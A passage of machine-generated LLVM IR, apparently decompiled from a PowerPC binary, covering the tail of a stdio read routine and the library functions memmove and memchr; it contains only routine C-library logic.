  %v3_1000eeec = icmp eq i32 %v3_1000eee8, -2
  br i1 %v3_1000eeec, label %dec_label_pc_1000eef4, label %dec_label_pc_1000ef04

dec_label_pc_1000eef4:                            ; preds = %dec_label_pc_1000eee8
  %v1_1000eef4 = or i32 %v3_1000ee9c, 4
  store i32 %v1_1000eef4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000eefc = trunc i32 %v1_1000eef4 to i16
  store i16 %v1_1000eefc, i16* %v1_1000ee9c, align 2
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000ef04:                            ; preds = %dec_label_pc_1000eee8
  %v1_1000ef04 = and i32 %v3_1000ee9c, 768
  store i32 %v1_1000ef04, i32* %r0.global-to-local, align 4
  %v3_1000ef04 = icmp eq i32 %v1_1000ef04, 0
  br i1 %v3_1000ef04, label %dec_label_pc_1000ef18, label %dec_label_pc_1000ef0c

dec_label_pc_1000ef0c:                            ; preds = %dec_label_pc_1000ef04
  store i32 ptrtoint (i32** @global_var_1002c2bc.141 to i32), i32* %r3.global-to-local, align 4
  store i32 268496664, i32* @lr, align 4
  %v4_1000ef14 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002c2bc.141 to i16*), i32 %v3_1000eecc)
  store i32 %v4_1000ef14, i32* %r3.global-to-local, align 4
  %v0_1000ef18.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ef18

dec_label_pc_1000ef18:                            ; preds = %dec_label_pc_1000ef04, %dec_label_pc_1000ef0c
  %v0_1000ef58 = phi i32 [ %v2_1000eefc, %dec_label_pc_1000ef04 ], [ %v0_1000ef18.pre, %dec_label_pc_1000ef0c ]
  %v1_1000ef18 = add i32 %v0_1000ef58, 8
  %v2_1000ef18 = inttoptr i32 %v1_1000ef18 to i32*
  %v3_1000ef18 = load i32, i32* %v2_1000ef18, align 4
  store i32 %v3_1000ef18, i32* %r9.global-to-local, align 4
  %v1_1000ef1c = add i32 %v0_1000ef58, 12
  %v2_1000ef1c = inttoptr i32 %v1_1000ef1c to i32*
  %v3_1000ef1c = load i32, i32* %v2_1000ef1c, align 4
  store i32 %v3_1000ef1c, i32* %r0.global-to-local, align 4
  %v4_1000ef20 = icmp eq i32 %v3_1000ef1c, %v3_1000ef18
  br i1 %v4_1000ef20, label %dec_label_pc_1000ef58, label %dec_label_pc_1000ef28

dec_label_pc_1000ef28:                            ; preds = %dec_label_pc_1000ef18
  %v2_1000ef28 = add i32 %v0_1000ef58, 24
  %v3_1000ef28 = inttoptr i32 %v2_1000ef28 to i32*
  store i32 %v3_1000ef18, i32* %v3_1000ef28, align 4
  %v0_1000ef2c = load i32, i32* @r31, align 4
  store i32 %v0_1000ef2c, i32* %r3.global-to-local, align 4
  store i32 268496692, i32* @lr, align 4
  %v3_1000ef30 = call i32 @__stdio_rfill(i32 %v0_1000ef2c, i32 %v3_1000ef18)
  store i32 %v3_1000ef30, i32* %r3.global-to-local, align 4
  %v3_1000ef34 = icmp eq i32 %v3_1000ef30, 0
  br i1 %v3_1000ef34, label %dec_label_pc_1000ef78, label %dec_label_pc_1000ef3c

dec_label_pc_1000ef3c:                            ; preds = %dec_label_pc_1000ef28
  %v0_1000ef3c = load i32, i32* @r31, align 4
  %v1_1000ef3c = add i32 %v0_1000ef3c, 20
  %v2_1000ef3c = inttoptr i32 %v1_1000ef3c to i32*
  %v3_1000ef3c = load i32, i32* %v2_1000ef3c, align 4
  store i32 %v3_1000ef3c, i32* %r0.global-to-local, align 4
  %v1_1000ef40 = add i32 %v0_1000ef3c, 16
  %v2_1000ef40 = inttoptr i32 %v1_1000ef40 to i32*
  %v3_1000ef40 = load i32, i32* %v2_1000ef40, align 4
  store i32 %v3_1000ef40, i32* %r9.global-to-local, align 4
  %v2_1000ef44 = add i32 %v0_1000ef3c, 24
  %v3_1000ef44 = inttoptr i32 %v2_1000ef44 to i32*
  store i32 %v3_1000ef3c, i32* %v3_1000ef44, align 4
  %v0_1000ef48 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ef48 = add i32 %v0_1000ef48, 1
  store i32 %v1_1000ef48, i32* %r0.global-to-local, align 4
  %v1_1000ef4c = inttoptr i32 %v0_1000ef48 to i8*
  %v2_1000ef4c = load i8, i8* %v1_1000ef4c, align 1
  %v3_1000ef4c = zext i8 %v2_1000ef4c to i32
  store i32 %v3_1000ef4c, i32* %r3.global-to-local, align 4
  %v1_1000ef50.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000ef50:                            ; preds = %dec_label_pc_1000eedc, %dec_label_pc_1000ef3c
  %v1_1000ef50 = phi i32 [ %v1_1000ef507, %dec_label_pc_1000eedc ], [ %v1_1000ef50.pre, %dec_label_pc_1000ef3c ]
  %v0_1000ef50 = phi i32 [ %v1_1000eee0, %dec_label_pc_1000eedc ], [ %v1_1000ef48, %dec_label_pc_1000ef3c ]
  %v2_1000ef50 = add i32 %v1_1000ef50, 16
  %v3_1000ef50 = inttoptr i32 %v2_1000ef50 to i32*
  store i32 %v0_1000ef50, i32* %v3_1000ef50, align 4
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000ef58:                            ; preds = %dec_label_pc_1000ef18
  %v1_1000ef58 = inttoptr i32 %v0_1000ef58 to i16*
  store i32 %v0_1000ef58, i32* %r3.global-to-local, align 4
  %v2_1000ef5c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268496744, i32* @lr, align 4
  %v5_1000ef64 = call i32 @__stdio_READ(i16* %v1_1000ef58, i32 %v2_1000ef5c, i32 1)
  store i32 %v5_1000ef64, i32* %r3.global-to-local, align 4
  %v3_1000ef68 = icmp eq i32 %v5_1000ef64, 0
  br i1 %v3_1000ef68, label %dec_label_pc_1000ef78, label %dec_label_pc_1000ef70

dec_label_pc_1000ef70:                            ; preds = %dec_label_pc_1000ef58
  %v3_1000ef70 = load i8, i8* %stack_var_-24, align 1
  %v4_1000ef70 = sext i8 %v3_1000ef70 to i32
  store i32 %v4_1000ef70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000ef78:                            ; preds = %dec_label_pc_1000ee8c, %dec_label_pc_1000ef58, %dec_label_pc_1000ef28
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000ef7c:                            ; preds = %dec_label_pc_1000ef70, %dec_label_pc_1000ef50, %dec_label_pc_1000eef4, %dec_label_pc_1000eea8, %dec_label_pc_1000ef78
  store i32 %v0_1000ee58, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ee60, i32* @r31, align 4
  %v0_1000ef8c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ef8c

; uselistorder directives
  uselistorder i32 %v0_1000ef58, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000eedc, { 1, 0 }
  uselistorder i32 %v3_1000eecc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000eeac, { 1, 0 }
  uselistorder i32 %v3_1000ee9c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_1000eefc, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_1002c2bc.141 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002bf30.140, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ef7c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000ef78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ef50, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef18, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000ef90 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* @r8, align 4
  %v0_1000ef98 = load i32, i32* @r5, align 4
  store i32 %v0_1000ef98, i32* @r11, align 4
  br i1 %v2_1000ef90, label %dec_label_pc_1000efa4, label %dec_label_pc_1000efa0

dec_label_pc_1000efa0:                            ; preds = %entry
  %v0_1000efa0 = call i32 @memcpy()
  store i32 %v0_1000efa0, i32* @r3, align 4
  %v0_1000efa4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000efa4

dec_label_pc_1000efa4:                            ; preds = %entry, %dec_label_pc_1000efa0
  %v0_1000efa4 = phi i32 [ %v0_1000ef98, %entry ], [ %v0_1000efa4.pre, %dec_label_pc_1000efa0 ]
  %v1_1000efa4 = call i32 @__asm_rlwinm.(i32 %v0_1000efa4, i32 29, i32 3, i32 31)
  store i32 %v1_1000efa4, i32* %r9.global-to-local, align 4
  %v4_1000efa4 = icmp eq i32 %v1_1000efa4, 0
  %v1_1000efa8 = load i32, i32* @r5, align 4
  %v2_1000efa8 = add i32 %v1_1000efa8, %arg2
  store i32 %v2_1000efa8, i32* %r4.global-to-local, align 4
  %v0_1000efac = load i32, i32* @r3, align 4
  %v2_1000efac = add i32 %v0_1000efac, %v1_1000efa8
  store i32 %v2_1000efac, i32* %r10.global-to-local, align 4
  br i1 %v4_1000efa4, label %dec_label_pc_1000efd4, label %dec_label_pc_1000efb4

dec_label_pc_1000efb4:                            ; preds = %dec_label_pc_1000efa4
  %v1_1000efb4 = urem i32 %v2_1000efac, 4
  %v3_1000efb4 = icmp eq i32 %v1_1000efb4, 0
  br i1 %v3_1000efb4, label %dec_label_pc_1000efbc, label %dec_label_pc_1000f008

dec_label_pc_1000efbc:                            ; preds = %dec_label_pc_1000f020.dec_label_pc_1000efbc_crit_edge, %dec_label_pc_1000efb4
  %v1_1000efc8.pre = phi i32 [ %v1_1000efc8.pre.pre, %dec_label_pc_1000f020.dec_label_pc_1000efbc_crit_edge ], [ %v2_1000efac, %dec_label_pc_1000efb4 ]
  %v0_1000efbc = phi i32 [ %v1_1000f020, %dec_label_pc_1000f020.dec_label_pc_1000efbc_crit_edge ], [ %v1_1000efa4, %dec_label_pc_1000efb4 ]
  store i32 %v0_1000efbc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000efc0

dec_label_pc_1000efc0:                            ; preds = %dec_label_pc_1000efc0, %dec_label_pc_1000efbc
  %v1_1000efc8 = phi i32 [ %v2_1000efcc, %dec_label_pc_1000efc0 ], [ %v1_1000efc8.pre, %dec_label_pc_1000efbc ]
  %v0_1000efc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000efc0 = add i32 %v0_1000efc0, -4
  %v2_1000efc0 = inttoptr i32 %v1_1000efc0 to i32*
  %v3_1000efc0 = load i32, i32* %v2_1000efc0, align 4
  %v1_1000efc4 = add i32 %v0_1000efc0, -8
  %v2_1000efc4 = inttoptr i32 %v1_1000efc4 to i32*
  %v3_1000efc4 = load i32, i32* %v2_1000efc4, align 4
  store i32 %v3_1000efc4, i32* %r9.global-to-local, align 4
  store i32 %v1_1000efc4, i32* %r4.global-to-local, align 4
  %v2_1000efc8 = add i32 %v1_1000efc8, -4
  %v3_1000efc8 = inttoptr i32 %v2_1000efc8 to i32*
  store i32 %v3_1000efc0, i32* %v3_1000efc8, align 4
  %v0_1000efcc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000efcc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000efcc = add i32 %v1_1000efcc, -8
  %v3_1000efcc = inttoptr i32 %v2_1000efcc to i32*
  store i32 %v0_1000efcc, i32* %v3_1000efcc, align 4
  store i32 %v2_1000efcc, i32* %r10.global-to-local, align 4
  %v0_1000efd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000efd0 = add i32 %v0_1000efd0, -1
  store i32 %v1_1000efd0, i32* %ctr.global-to-local, align 4
  %v2_1000efd0 = icmp eq i32 %v1_1000efd0, 0
  br i1 %v2_1000efd0, label %dec_label_pc_1000efd4, label %dec_label_pc_1000efc0

dec_label_pc_1000efd4:                            ; preds = %dec_label_pc_1000efc0, %dec_label_pc_1000f020, %dec_label_pc_1000efa4
  %v0_1000efd4 = load i32, i32* @r11, align 4
  %v1_1000efd4 = urem i32 %v0_1000efd4, 8
  store i32 %v1_1000efd4, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000efd4, 4
  br i1 %tmp, label %dec_label_pc_1000efec, label %dec_label_pc_1000efe0

dec_label_pc_1000efe0:                            ; preds = %dec_label_pc_1000efd4
  %v0_1000efe0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000efe0 = add i32 %v0_1000efe0, -4
  %v2_1000efe0 = inttoptr i32 %v1_1000efe0 to i32*
  %v3_1000efe0 = load i32, i32* %v2_1000efe0, align 4
  store i32 %v1_1000efe0, i32* %r4.global-to-local, align 4
  %v1_1000efe4 = add nsw i32 %v1_1000efd4, -4
  store i32 %v1_1000efe4, i32* %r5.global-to-local, align 4
  %v1_1000efe8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000efe8 = add i32 %v1_1000efe8, -4
  %v3_1000efe8 = inttoptr i32 %v2_1000efe8 to i32*
  store i32 %v3_1000efe0, i32* %v3_1000efe8, align 4
  store i32 %v2_1000efe8, i32* %r10.global-to-local, align 4
  %v0_1000efec.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000efec

dec_label_pc_1000efec:                            ; preds = %dec_label_pc_1000efd4, %dec_label_pc_1000efe0
  %v0_1000eff4 = phi i32 [ %v1_1000efd4, %dec_label_pc_1000efd4 ], [ %v0_1000efec.pre, %dec_label_pc_1000efe0 ]
  %v3_1000efec = icmp eq i32 %v0_1000eff4, 0
  br i1 %v3_1000efec, label %dec_label_pc_1000f02c, label %dec_label_pc_1000eff4

dec_label_pc_1000eff4:                            ; preds = %dec_label_pc_1000efec
  store i32 %v0_1000eff4, i32* %ctr.global-to-local, align 4
  %v2_1000effc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000eff8

dec_label_pc_1000eff8:                            ; preds = %dec_label_pc_1000eff8, %dec_label_pc_1000eff4
  %v2_1000effc = phi i32 [ %v3_1000effc, %dec_label_pc_1000eff8 ], [ %v2_1000effc.pre, %dec_label_pc_1000eff4 ]
  %v0_1000eff8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eff8 = add i32 %v0_1000eff8, -1
  %v2_1000eff8 = inttoptr i32 %v1_1000eff8 to i8*
  %v3_1000eff8 = load i8, i8* %v2_1000eff8, align 1
  store i32 %v1_1000eff8, i32* %r4.global-to-local, align 4
  %v3_1000effc = add i32 %v2_1000effc, -1
  %v4_1000effc = inttoptr i32 %v3_1000effc to i8*
  store i8 %v3_1000eff8, i8* %v4_1000effc, align 1
  store i32 %v3_1000effc, i32* %r10.global-to-local, align 4
  %v0_1000f000 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f000 = add i32 %v0_1000f000, -1
  store i32 %v1_1000f000, i32* %ctr.global-to-local, align 4
  %v2_1000f000 = icmp eq i32 %v1_1000f000, 0
  br i1 %v2_1000f000, label %dec_label_pc_1000f02c, label %dec_label_pc_1000eff8

dec_label_pc_1000f008:                            ; preds = %dec_label_pc_1000efb4
  %v1_1000f008 = sub nsw i32 4, %v1_1000efb4
  store i32 %v1_1000f008, i32* %ctr.global-to-local, align 4
  %v2_1000f010 = sub i32 %v1_1000efa8, %v1_1000f008
  store i32 %v2_1000f010, i32* @r11, align 4
  %v1_1000f0149 = add i32 %v2_1000efa8, -1
  %v2_1000f01410 = inttoptr i32 %v1_1000f0149 to i8*
  %v3_1000f01411 = load i8, i8* %v2_1000f01410, align 1
  store i32 %v1_1000f0149, i32* %r4.global-to-local, align 4
  %v3_1000f01813 = add i32 %v2_1000efac, -1
  %v4_1000f01814 = inttoptr i32 %v3_1000f01813 to i8*
  store i8 %v3_1000f01411, i8* %v4_1000f01814, align 1
  store i32 %v3_1000f01813, i32* %r10.global-to-local, align 4
  %v0_1000f01c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f01c16 = add i32 %v0_1000f01c15, -1
  store i32 %v1_1000f01c16, i32* %ctr.global-to-local, align 4
  %v2_1000f01c17 = icmp eq i32 %v1_1000f01c16, 0
  br i1 %v2_1000f01c17, label %dec_label_pc_1000f020, label %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge

dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge: ; preds = %dec_label_pc_1000f008, %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge
  %v3_1000f01818 = phi i32 [ %v3_1000f018, %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge ], [ %v3_1000f01813, %dec_label_pc_1000f008 ]
  %v0_1000f014.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f014 = add i32 %v0_1000f014.pre, -1
  %v2_1000f014 = inttoptr i32 %v1_1000f014 to i8*
  %v3_1000f014 = load i8, i8* %v2_1000f014, align 1
  store i32 %v1_1000f014, i32* %r4.global-to-local, align 4
  %v3_1000f018 = add i32 %v3_1000f01818, -1
  %v4_1000f018 = inttoptr i32 %v3_1000f018 to i8*
  store i8 %v3_1000f014, i8* %v4_1000f018, align 1
  store i32 %v3_1000f018, i32* %r10.global-to-local, align 4
  %v0_1000f01c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f01c = add i32 %v0_1000f01c, -1
  store i32 %v1_1000f01c, i32* %ctr.global-to-local, align 4
  %v2_1000f01c = icmp eq i32 %v1_1000f01c, 0
  br i1 %v2_1000f01c, label %dec_label_pc_1000f020, label %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge

dec_label_pc_1000f020:                            ; preds = %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge, %dec_label_pc_1000f008
  %v0_1000f020 = load i32, i32* @r11, align 4
  %v1_1000f020 = call i32 @__asm_rlwinm.(i32 %v0_1000f020, i32 29, i32 3, i32 31)
  store i32 %v1_1000f020, i32* %r9.global-to-local, align 4
  %v4_1000f020 = icmp eq i32 %v1_1000f020, 0
  br i1 %v4_1000f020, label %dec_label_pc_1000efd4, label %dec_label_pc_1000f020.dec_label_pc_1000efbc_crit_edge

dec_label_pc_1000f020.dec_label_pc_1000efbc_crit_edge: ; preds = %dec_label_pc_1000f020
  %v1_1000efc8.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000efbc

dec_label_pc_1000f02c:                            ; preds = %dec_label_pc_1000eff8, %dec_label_pc_1000efec
  %v0_1000f02c = load i32, i32* @r8, align 4
  ret i32 %v0_1000f02c

; uselistorder directives
  uselistorder i32 %v1_1000f020, { 1, 2, 0 }
  uselistorder i32 %v1_1000f01c, { 1, 0 }
  uselistorder i32 %v3_1000f018, { 1, 2, 0 }
  uselistorder i32 %v1_1000f000, { 1, 0 }
  uselistorder i32 %v3_1000effc, { 1, 2, 0 }
  uselistorder i32 %v1_1000efd4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000efd0, { 1, 0 }
  uselistorder i32 %v2_1000efcc, { 1, 2, 0 }
  uselistorder i32 %v1_1000efb4, { 1, 0 }
  uselistorder i32 %v2_1000efac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000efa8, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder label %dec_label_pc_1000f014.dec_label_pc_1000f014_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000efec, { 1, 0 }
  uselistorder label %dec_label_pc_1000efd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000efa4, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000f038 = urem i32 %arg1, 256
  store i32 %v1_1000f038, i32* %r4.global-to-local, align 4
  %v0_1000f0587 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000f05c13 = icmp eq i32 %arg2, 0
  br i1 %v2_1000f05c13, label %dec_label_pc_1000f064, label %dec_label_pc_1000f060

dec_label_pc_1000f044:                            ; preds = %dec_label_pc_1000f060
  %v1_1000f044 = inttoptr i32 %v0_1000f044 to i8*
  %v2_1000f044 = load i8, i8* %v1_1000f044, align 1
  %v3_1000f044 = zext i8 %v2_1000f044 to i32
  %v0_1000f048 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f048 = add i32 %v0_1000f048, -1
  store i32 %v1_1000f048, i32* %r5.global-to-local, align 4
  %v1_1000f04c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000f04c = icmp eq i32 %v3_1000f044, %v1_1000f04c
  %v0_1000f050 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f04c, i32 %v0_1000f050)
  %v0_1000f054 = load i32, i32* @r3, align 4
  %v1_1000f054 = add i32 %v0_1000f054, 1
  store i32 %v1_1000f054, i32* @r3, align 4
  %v0_1000f05c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f05c = add i32 %v0_1000f05c, -1
  store i32 %v1_1000f05c, i32* %ctr.global-to-local, align 4
  %v2_1000f05c = icmp eq i32 %v1_1000f05c, 0
  br i1 %v2_1000f05c, label %dec_label_pc_1000f064.loopexit, label %dec_label_pc_1000f060

dec_label_pc_1000f060:                            ; preds = %entry, %dec_label_pc_1000f044
  %v0_1000f044 = phi i32 [ %v1_1000f054, %dec_label_pc_1000f044 ], [ %v0_1000f0587, %entry ]
  %v0_1000f060.in.in = phi i32 [ %v1_1000f054, %dec_label_pc_1000f044 ], [ %v0_1000f0587, %entry ]
  %v0_1000f060.in = urem i32 %v0_1000f060.in.in, 4
  %v0_1000f060 = icmp eq i32 %v0_1000f060.in, 0
  br i1 %v0_1000f060, label %dec_label_pc_1000f064.loopexit, label %dec_label_pc_1000f044

dec_label_pc_1000f064.loopexit:                   ; preds = %dec_label_pc_1000f060, %dec_label_pc_1000f044
  %v0_1000f08c16.ph = phi i32 [ %v1_1000f054, %dec_label_pc_1000f044 ], [ %v0_1000f044, %dec_label_pc_1000f060 ]
  %v0_1000f064.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000f068.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000f064

dec_label_pc_1000f064:                            ; preds = %dec_label_pc_1000f064.loopexit, %entry
  %v0_1000f068 = phi i32 [ 0, %entry ], [ %v0_1000f068.pre, %dec_label_pc_1000f064.loopexit ]
  %v0_1000f064 = phi i32 [ %v1_1000f038, %entry ], [ %v0_1000f064.pre, %dec_label_pc_1000f064.loopexit ]
  %v0_1000f08c16 = phi i32 [ %v0_1000f0587, %entry ], [ %v0_1000f08c16.ph, %dec_label_pc_1000f064.loopexit ]
  %v1_1000f064 = mul i32 %v0_1000f064, 256
  %v1_1000f068 = udiv i32 %v0_1000f068, 4
  %v2_1000f06c = or i32 %v1_1000f064, %v0_1000f064
  %v1_1000f074 = mul i32 %v2_1000f06c, 65536
  %v2_1000f080 = or i32 %v1_1000f074, %v2_1000f06c
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_1000f068, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000f068, 4
  br i1 %tmp, label %dec_label_pc_1000f114, label %dec_label_pc_1000f08c

dec_label_pc_1000f08c:                            ; preds = %dec_label_pc_1000f064, %dec_label_pc_1000f110.backedge
  %v0_1000f110 = phi i32 [ %v1_1000f110, %dec_label_pc_1000f110.backedge ], [ %v1_1000f068, %dec_label_pc_1000f064 ]
  %v0_1000f094 = phi i32 [ %v1_1000f094, %dec_label_pc_1000f110.backedge ], [ %v0_1000f068, %dec_label_pc_1000f064 ]
  %v0_1000f0cc = phi i32 [ %v1_1000f090, %dec_label_pc_1000f110.backedge ], [ %v0_1000f08c16, %dec_label_pc_1000f064 ]
  %v1_1000f08c = inttoptr i32 %v0_1000f0cc to i32*
  %v2_1000f08c = load i32, i32* %v1_1000f08c, align 4
  %v1_1000f090 = add i32 %v0_1000f0cc, 4
  store i32 %v1_1000f090, i32* @r3, align 4
  %v1_1000f094 = add i32 %v0_1000f094, -4
  store i32 %v1_1000f094, i32* %r5.global-to-local, align 4
  %v1_1000f098 = add i32 %v0_1000f0cc, 1
  store i32 %v1_1000f098, i32* @r10, align 4
  %v2_1000f09c = xor i32 %v2_1000f08c, %v2_1000f080
  %v1_1000f0a4 = add i32 %v2_1000f09c, 2130640639
  %v2_1000f0a8 = xor i32 %v1_1000f0a4, %v2_1000f09c
  %v2_1000f0ac = and i32 %v2_1000f0a8, -2130640640
  %v6_1000f0ac = icmp eq i32 %v2_1000f0ac, -2130640640
  br i1 %v6_1000f0ac, label %dec_label_pc_1000f110.backedge, label %dec_label_pc_1000f0b8

dec_label_pc_1000f110.backedge:                   ; preds = %dec_label_pc_1000f08c, %dec_label_pc_1000f0fc
  %v1_1000f110 = add i32 %v0_1000f110, -1
  store i32 %v1_1000f110, i32* %ctr.global-to-local, align 4
  %v2_1000f110 = icmp eq i32 %v1_1000f110, 0
  br i1 %v2_1000f110, label %dec_label_pc_1000f114, label %dec_label_pc_1000f08c

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f08c
  %v2_1000f0b8 = inttoptr i32 %v0_1000f0cc to i8*
  %v3_1000f0b8 = load i8, i8* %v2_1000f0b8, align 1
  %v4_1000f0b8 = zext i8 %v3_1000f0b8 to i32
  %v1_1000f0bc = add i32 %v0_1000f0cc, 3
  store i32 %v1_1000f0bc, i32* @r8, align 4
  %v1_1000f0c0 = add i32 %v0_1000f0cc, 2
  %v4_1000f0c4 = icmp eq i32 %v4_1000f0b8, %v0_1000f064
  br i1 %v4_1000f0c4, label %dec_label_pc_1000f0cc, label %dec_label_pc_1000f0d4

dec_label_pc_1000f0cc:                            ; preds = %dec_label_pc_1000f0b8
  ret i32 %v0_1000f0cc

dec_label_pc_1000f0d4:                            ; preds = %dec_label_pc_1000f0b8
  %v2_1000f0d4 = inttoptr i32 %v1_1000f098 to i8*
  %v3_1000f0d4 = load i8, i8* %v2_1000f0d4, align 1
  %v4_1000f0d4 = zext i8 %v3_1000f0d4 to i32
  %v4_1000f0d8 = icmp eq i32 %v4_1000f0d4, %v0_1000f064
  br i1 %v4_1000f0d8, label %dec_label_pc_1000f0e0, label %dec_label_pc_1000f0e8

dec_label_pc_1000f0e0:                            ; preds = %dec_label_pc_1000f0d4
  ret i32 %v1_1000f098

dec_label_pc_1000f0e8:                            ; preds = %dec_label_pc_1000f0d4
  %v2_1000f0e8 = inttoptr i32 %v1_1000f0c0 to i8*
  %v3_1000f0e8 = load i8, i8* %v2_1000f0e8, align 1
  %v4_1000f0e8 = zext i8 %v3_1000f0e8 to i32
  %v4_1000f0ec = icmp eq i32 %v4_1000f0e8, %v0_1000f064
  br i1 %v4_1000f0ec, label %dec_label_pc_1000f0f4, label %dec_label_pc_1000f0fc

dec_label_pc_1000f0f4:                            ; preds = %dec_label_pc_1000f0e8
  ret i32 %v1_1000f0c0

dec_label_pc_1000f0fc:                            ; preds = %dec_label_pc_1000f0e8
  %v2_1000f0fc = inttoptr i32 %v1_1000f0bc to i8*
  %v3_1000f0fc = load i8, i8* %v2_1000f0fc, align 1
  %v4_1000f0fc = zext i8 %v3_1000f0fc to i32
  %v4_1000f100 = icmp eq i32 %v4_1000f0fc, %v0_1000f064
  br i1 %v4_1000f100, label %dec_label_pc_1000f108, label %dec_label_pc_1000f110.backedge

dec_label_pc_1000f108:                            ; preds = %dec_label_pc_1000f0fc
  ret i32 %v1_1000f0bc

dec_label_pc_1000f114:                            ; preds = %dec_label_pc_1000f110.backedge, %dec_label_pc_1000f064
  %v0_1000f12026 = phi i32 [ %v0_1000f08c16, %dec_label_pc_1000f064 ], [ %v1_1000f090, %dec_label_pc_1000f110.backedge ]
  %v0_1000f114 = phi i32 [ %v0_1000f068, %dec_label_pc_1000f064 ], [ %v1_1000f094, %dec_label_pc_1000f110.backedge ]
  %v1_1000f114 = add i32 %v0_1000f114, 1
  store i32 %v1_1000f114, i32* %r5.global-to-local, align 4
  store i32 %v0_1000f114, i32* %ctr.global-to-local, align 4
  %v2_1000f1303 = icmp eq i32 %v0_1000f114, 0
  br i1 %v2_1000f1303, label %dec_label_pc_1000f134, label %dec_label_pc_1000f120

dec_label_pc_1000f120:                            ; preds = %dec_label_pc_1000f114, %dec_label_pc_1000f120.dec_label_pc_1000f120_crit_edge
  %v1_1000f124 = phi i32 [ %v1_1000f124.pre, %dec_label_pc_1000f120.dec_label_pc_1000f120_crit_edge ], [ %v0_1000f064, %dec_label_pc_1000f114 ]
